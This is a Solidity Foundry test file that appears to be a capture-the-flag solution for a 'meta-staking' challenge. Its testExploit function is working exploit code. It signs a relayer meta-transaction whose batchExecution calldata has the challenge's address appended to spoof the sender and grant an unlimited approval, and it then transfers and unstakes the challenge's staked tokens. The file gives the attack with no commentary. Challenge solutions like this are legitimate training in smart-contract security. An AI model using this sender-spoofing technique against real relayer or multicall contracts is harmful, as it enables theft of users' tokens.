// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";

import {Setup as Challenge} from "../../src/meta-staking/Setup.sol";
import {GREY} from "../../src/meta-staking/lib/GREY.sol";
import {Relayer} from "../../src/meta-staking/Relayer.sol";
import {Staking} from "../../src/meta-staking/Staking.sol";

contract SolutionTest is Test {
    Challenge internal challenge;
    GREY public grey;
    Relayer public relayer;
    Staking public staking;

    function setUp() public {
        challenge = new Challenge();
        grey = challenge.grey();
        relayer = challenge.relayer();
        staking = challenge.staking();
    }

    function testExploit() public {
        uint256 pk = block.timestamp;
        address addr = vm.addr(pk);

        bytes memory d0 = abi.encodeWithSelector(0x095ea7b3, address(this), type(uint256).max);
        d0 = abi.encodePacked(d0, address(challenge));

        bytes[] memory d = new bytes[](1);
        d[0] = d0;

        // batchExecution
        bytes memory data = abi.encodeWithSelector(0x856a65eb, d);
        Relayer.Transaction memory transaction =
            Relayer.Transaction({from: addr, to: address(staking), value: 0, gas: 100000 wei, data: data});

        bytes32 digest = keccak256(abi.encode(transaction, 0));

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, digest);

        Relayer.Signature memory signature = Relayer.Signature({v: v, r: r, s: s, deadline: type(uint256).max});

        Relayer.TransactionRequest memory transactionRequest =
            Relayer.TransactionRequest({transaction: transaction, signature: signature});

        relayer.execute(transactionRequest);

        staking.transferFrom(address(challenge), address(this), staking.balanceOf(address(challenge)));
        staking.unstake(staking.balanceOf(address(this)));

        assertTrue(challenge.isSolved());
    }
}
